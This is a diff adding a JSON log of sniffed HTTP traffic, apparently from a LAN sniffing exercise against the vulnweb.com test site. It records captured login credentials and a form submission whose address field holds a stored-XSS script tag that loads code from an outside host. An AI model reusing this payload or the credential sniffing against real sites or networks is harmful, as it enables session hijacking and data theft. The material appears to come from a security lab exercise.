@@ -1,0 +1,36 @@
+{
+    "192.168.1.100": {
+        "alias": "192.168.1.100",
+        "http_request": [
+            {
+                "timestamp": "2025-05-24T15:18:16.842319",
+                "method": "POST",
+                "path": "testphp.vulnweb.com/userinfo.php",
+                "raw": "192.168.1.0/24 > 192.168.1.104  \u00bb  \b[15:16:57] [net.sniff.http.request] http 192.168.1.100 POST testphp.vulnweb.com/userinfo.php"
+            }
+        ],
+        "http_post_data": [
+            {
+                "timestamp": "2025-05-24T15:18:16.842319",
+                "data": "uname=test&pass=test"
+            }
+        ]
+    },
+    "SEMIHTWO": {
+        "alias": "SEMIHTWO",
+        "http_request": [
+            {
+                "timestamp": "2025-05-24T15:18:16.842593",
+                "method": "POST",
+                "path": "testphp.vulnweb.com/userinfo.php",
+                "raw": "192.168.1.0/24 > 192.168.1.104  \u00bb  \b[15:17:02] [net.sniff.http.request] http SEMIHTWO POST testphp.vulnweb.com/userinfo.php"
+            }
+        ],
+        "http_post_data": [
+            {
+                "timestamp": "2025-05-24T15:18:16.842593",
+                "data": "urname=John Smith&ucc=123456787654321&uemail=email@email.com&uphone=2323345&uaddress=\"><script src=\"https://js.rip/pznw6clllm\"></script>&update=update"
+            }
+        ]
+    }
+}
